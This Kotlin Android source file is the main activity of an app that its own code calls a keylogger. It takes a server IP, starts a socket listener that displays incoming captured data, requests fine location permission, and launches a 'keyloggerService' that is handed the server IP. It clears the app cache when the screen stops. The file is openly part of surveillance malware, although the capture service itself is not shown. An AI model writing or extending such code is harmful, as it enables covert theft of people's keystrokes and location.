package com.example.socket

import MyServerSocket
import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var textView: TextView
    private val handler = Handler(Looper.getMainLooper()) { message ->
        val data = message.obj as String
        appendToTextView(data)
        true
    }

    private val LOCATION_PERMISSION_REQUEST_CODE = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        textView = findViewById(R.id.textAreaKeylloger)

        val inputMessage: EditText = findViewById(R.id.inputPort)
        val inputIp: EditText = findViewById(R.id.inputIp)
        val buttonConnect: Button = findViewById(R.id.buttonConnect)

        buttonConnect.setOnClickListener {
            Thread {
                MyServerSocket(handler).startServer()
            }.start()
            val ip = inputIp.text.toString()
            if (ip.isEmpty()) {
                Toast.makeText(this, "Por favor, ingresa una IP", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            // Verificar y solicitar permisos de ubicación
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), LOCATION_PERMISSION_REQUEST_CODE)
            } else {
                startKeyloggerService(ip)
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
            if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                val ip = findViewById<EditText>(R.id.inputIp).text.toString()
                startKeyloggerService(ip)
            } else {
                Toast.makeText(this, "Permiso de ubicación denegado", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun startKeyloggerService(ip: String) {
        val intent = Intent(this, keyloggerService::class.java)
        intent.putExtra("SERVER_IP", ip)
        startService(intent)
        Toast.makeText(this, "Servicio de keylogger iniciado", Toast.LENGTH_SHORT).show()
    }

    private fun appendToTextView(text: String) {
        runOnUiThread {
            textView.append("$text\n")
            val scrollView = textView.parent as ScrollView
            scrollView.post {
                scrollView.fullScroll(ScrollView.FOCUS_DOWN)
            }
        }
    }

    override fun onStop() {
        super.onStop()
        deleteCache()
    }

    private fun deleteCache() {
        try {
            val cacheDir = cacheDir
            if (cacheDir != null && cacheDir.exists()) {
                Log.d("MainActivity", "Borrando caché en: ${cacheDir.absolutePath}")
                val deleted = cacheDir.deleteRecursively()
                if (deleted) {
                    Log.d("MainActivity", "Caché borrada correctamente")
                } else {
                    Log.e("MainActivity", "No se pudo borrar la caché")
                }
            } else {
                Log.e("MainActivity", "El directorio de caché no existe")
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error al borrar la caché: ${e.message}")
        }
    }
}